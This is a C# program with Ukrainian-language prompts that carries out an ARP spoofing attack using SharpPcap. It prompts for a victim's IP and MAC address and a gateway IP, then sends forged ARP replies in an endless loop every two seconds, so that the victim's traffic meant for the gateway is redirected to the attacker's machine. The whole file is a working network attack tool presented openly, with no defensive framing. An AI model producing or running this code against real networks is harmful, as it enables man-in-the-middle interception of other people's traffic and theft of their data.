using System;
using PacketDotNet;
using SharpPcap;
using System.Net;
using System.Net.NetworkInformation;

class ArpSpoofing
{
    static void Main(string[] args)
    {
        Console.OutputEncoding = System.Text.Encoding.UTF8;
        Console.InputEncoding = System.Text.Encoding.UTF8;
        var devices = CaptureDeviceList.Instance;
        if (devices.Count == 0)
        {
            Console.WriteLine("Не знайдено жодного пристрою. Переконайтеся, що SharpPcap встановлений та доступний.");
            return;
        }

        Console.WriteLine("Доступні пристрої:");
        for (int i = 0; i < devices.Count; i++)
        {
            Console.WriteLine($"[{i}] {devices[i].Description}");
        }

        Console.Write("Оберіть індекс пристрою: ");
        if (!int.TryParse(Console.ReadLine(), out int deviceIndex) || deviceIndex < 0 || deviceIndex >= devices.Count)
        {
            Console.WriteLine("Некоректний індекс пристрою.");
            return;
        }

        var device = devices[deviceIndex];

        Console.Write("Введіть IP-адресу жертви: ");
        if (!IPAddress.TryParse(Console.ReadLine(), out IPAddress targetIp))
        {
            Console.WriteLine("Некоректна IP-адреса жертви.");
            return;
        }

        Console.Write("Введіть підроблену IP-адресу шлюзу: ");
        if (!IPAddress.TryParse(Console.ReadLine(), out IPAddress gatewayIp))
        {
            Console.WriteLine("Некоректна IP-адреса шлюзу.");
            return;
        }

        Console.Write("Введіть вашу MAC-адресу (наприклад, AA-BB-CC-DD-EE-FF): ");
        if (!TryParseMacAddress(Console.ReadLine(), out PhysicalAddress yourMac))
        {
            Console.WriteLine("Некоректна MAC-адреса.");
            return;
        }

        Console.Write("Введіть MAC-адресу жертви (наприклад, 00-11-22-33-44-55): ");
        if (!TryParseMacAddress(Console.ReadLine(), out PhysicalAddress targetMac))
        {
            Console.WriteLine("Некоректна MAC-адреса жертви.");
            return;
        }

        device.Open();

        Console.WriteLine("Надсилання ARP-спуфінг пакетів...");

        while (true)
        {
            // Створення Ethernet-пакету
            var ethernetPacket = new EthernetPacket(
                yourMac,                        // MAC-адреса
                targetMac,                      // MAC-адреса жертви
                EthernetType.Arp                // Тип Ethernet - ARP
            );

            // Створення ARP-пакету
            var arpPacket = new PacketDotNet.ArpPacket(
                ArpOperation.Response,
                yourMac,                        // MAC-адреса
                gatewayIp,                      // Підроблений шлюз IP
                targetMac,                      // MAC-адреса жертви
                targetIp                        // IP жертви
            );

            ethernetPacket.PayloadPacket = arpPacket;

            device.SendPacket(ethernetPacket);

            Console.WriteLine($"Надіслано ARP-пакет: {arpPacket}");
            System.Threading.Thread.Sleep(2000);
        }

        device.Close();
    }

    static bool TryParseMacAddress(string input, out PhysicalAddress macAddress)
    {
        try
        {
            macAddress = PhysicalAddress.Parse(input.Replace("-", "").Replace(":", ""));
            return true;
        }
        catch
        {
            macAddress = null;
            return false;
        }
    }
}